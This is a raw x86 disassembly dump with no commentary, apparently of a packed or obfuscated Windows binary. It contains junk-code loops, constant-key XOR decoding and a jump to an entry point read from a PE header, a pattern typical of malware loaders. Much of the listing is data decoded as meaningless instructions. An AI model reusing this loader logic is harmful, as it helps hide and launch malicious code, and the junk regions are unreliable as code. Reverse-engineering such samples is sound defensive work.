  40d6fa:	nop
  40d6fb:	je     0x40d6ff
  40d6fd:	ss aam 0xb7
  40d700:	aad    0x18
  40d702:	loopne 0x40d6da
  40d704:	xchg   ebp,eax
  40d705:	mov    al,BYTE PTR [ecx+0x184f0296]
  40d70b:	int3   
  40d70c:	leave  
  40d70d:	dec    ebx
  40d70e:	popa   
  40d70f:	mov    esp,fs
  40d711:	mov    ah,0xb0
  40d713:	ror    BYTE PTR [ebp+0x28],cl
  40d716:	mov    esi,0x6213bc34
  40d71b:	add    esp,DWORD PTR [ebx+0x2b8830cd]
  40d721:	dec    esi
  40d722:	xor    eax,DWORD PTR [ebp+0x408a122d]
  40d728:	pop    eax
  40d729:	fdivr  QWORD PTR [ebx-0x7d8b27a8]
  40d72f:	test   al,0xd2
  40d731:	mov    ds:0xb2c409e9,eax
  40d736:	stos   DWORD PTR es:[edi],eax
  40d737:	mov    ecx,0x8e2733cd
  40d73c:	and    eax,0xfc21ae2c
  40d741:	(bad)  [ecx]
  40d743:	jle    0x40d744
  40d745:	fwait
  40d746:	push   eax
  40d747:	xchg   ebx,eax
  40d748:	cmovae ecx,DWORD PTR [esi]
  40d74b:	fsub   QWORD PTR [ecx+0x347745e8]
  40d751:	mov    bl,0xd5
  40d753:	stos   DWORD PTR es:[edi],eax
  40d754:	inc    esp
  40d755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d756:	pop    esi
  40d757:	gs push edx
  40d759:	ja     0x40d707
  40d75b:	pop    es
  40d75c:	fdivp  st(6),st
  40d75f:	mov    eax,0xcb447636
  40d764:	mov    edx,DWORD PTR [esi+ebp*2]
  40d767:	xchg   esi,eax
  40d768:	and    eax,0x184057b4
  40d76d:	xchg   edi,eax
  40d76e:	in     eax,dx
  40d76f:	pushf  
  40d770:	fisubr WORD PTR ds:0x1d0d2e1d
  40d776:	nop
  40d777:	mov    edi,0xf7bbd823
  40d77c:	int    0xd4
  40d77e:	imul   ebp,DWORD PTR [esi+0x14d604fe],0xffffffb9
  40d785:	adc    bh,cl
  40d787:	sbb    esi,DWORD PTR [eax+0x68]
  40d78a:	mov    ebx,0x88a659a
  40d78f:	pop    edx
  40d790:	cld    
  40d791:	fidiv  DWORD PTR [esi]
  40d793:	lods   eax,DWORD PTR ds:[esi]
  40d794:	scas   al,BYTE PTR es:[edi]
  40d795:	cmp    al,bh
  40d797:	pop    eax
  40d798:	popa   
  40d799:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79b:	adc    DWORD PTR [ecx+0x3d5fcc44],0xffffffda
  40d7a2:	jbe    0x40d78f
  40d7a4:	int3   
  40d7a5:	sub    esp,DWORD PTR [eax+0x6c]
  40d7a8:	loopne 0x40d7b9
  40d7aa:	dec    esp
  40d7ab:	sbb    al,0x64
  40d7ad:	add    al,0x21
  40d7af:	shl    esp,0x9e
  40d7b2:	or     DWORD PTR [ebx],ebp
  40d7b4:	shl    DWORD PTR [edi],1
  40d7b6:	add    dl,BYTE PTR [edx]
  40d7b8:	leave  
  40d7b9:	xor    edi,eax
  40d7bb:	jg     0x40d7f8
  40d7bd:	loop   0x40d7f4
  40d7bf:	cli    
  40d7c0:	adc    DWORD PTR [edi+eiz*4],0xcd4dade2
  40d7c7:	mov    edi,0x4fef0c9b
  40d7cc:	pop    eax
  40d7cd:	int3   
  40d7ce:	push   ebp
  40d7cf:	(bad)  
  40d7d0:	frstor [edx+0x4d]
  40d7d3:	fwait
  40d7d4:	iret   
  40d7d5:	push   eax
  40d7d6:	xor    DWORD PTR [eax],esi
  40d7d8:	jns    0x40d7cb
  40d7da:	out    0xae,al
  40d7dc:	sbb    BYTE PTR [edi+0x1b926eb2],al
  40d7e2:	mov    edi,0x8e24e3b2
  40d7e7:	ret    
  40d7e8:	jns    0x40d795
  40d7ea:	shr    BYTE PTR [ecx-0x244138b1],cl
  40d7f0:	push   cs
  40d7f1:	out    0xc6,al
  40d7f3:	aas    
  40d7f4:	add    eax,0xd60cb40d
  40d7f9:	fs pop ebp
  40d7fb:	jg     0x40d830
  40d7fd:	icebp  
  40d7fe:	mov    ?,WORD PTR [ebp-0x5d]
  40d801:	pop    edi
  40d802:	xlat   BYTE PTR ds:[ebx]
  40d803:	rol    BYTE PTR [eax+0x1d],1
  40d806:	xlat   BYTE PTR ds:[ebx]
  40d807:	and    BYTE PTR [eax-0xc4f5a77],ch
  40d80d:	cld    
  40d80e:	add    edx,0xa9526db3
  40d814:	push   ebp
  40d815:	add    eax,0xcb1e8b4d
  40d81a:	ja     0x40d81b
  40d81c:	push   eax
  40d81d:	dec    ebp
  40d81e:	or     BYTE PTR [ecx+esi*1],ch
  40d821:	add    bl,al
  40d823:	stc    
  40d824:	add    DWORD PTR [edx-0xd],ebx
  40d827:	cli    
  40d828:	push   es
  40d829:	(bad)  
  40d82a:	mov    dh,0x50
  40d82c:	mov    esp,eax
  40d82e:	pop    ecx
  40d82f:	inc    esp
  40d830:	or     al,0xe0
  40d832:	es mov ch,0x5a
  40d835:	add    BYTE PTR [edi+esi*4+0x6d],0x95
  40d83a:	or     al,0xe5
  40d83c:	push   DWORD PTR [ebp-0x40]
  40d83f:	pop    ebp
  40d840:	mov    esi,0xc9a157f9
  40d845:	fisub  DWORD PTR ds:0x7b47b63e
  40d84b:	push   ecx
  40d84c:	add    edi,esp
  40d84e:	clc    
  40d84f:	pop    ecx
  40d850:	mov    al,ds:0xad2173b0
  40d855:	or     ah,ch
  40d857:	jnp    0x40d7ef
  40d859:	inc    esi
  40d85a:	out    dx,al
  40d85b:	sbb    ecx,DWORD PTR [ecx]
  40d85d:	(bad)  
  40d85e:	jle    0x40d830
  40d860:	add    al,0x50
  40d862:	mov    cl,0x76
  40d864:	mov    edi,0xbcb921a9
  40d869:	adc    BYTE PTR [esi+0x78057bc7],dh
  40d86f:	fisttp QWORD PTR [eax+0x58]
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x2999d044]
  40e122:	and    DWORD PTR [eax+0x68],esi
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e167
  40e12d:	jp     0x40e0c0
  40e12f:	and    DWORD PTR [edx-0x68de391d],ebx
  40e135:	add    eax,DWORD PTR [edi-0x7e]
  40e138:	loope  0x40e148
  40e13a:	pusha  
  40e13b:	mov    cl,0xf6
  40e13d:	or     al,0xe0
  40e13f:	mov    WORD PTR [esi-0x4c],cs
  40e142:	push   edi
  40e143:	aam    0xdb
  40e145:	jnp    0x40e19e
  40e147:	xor    al,0xfa
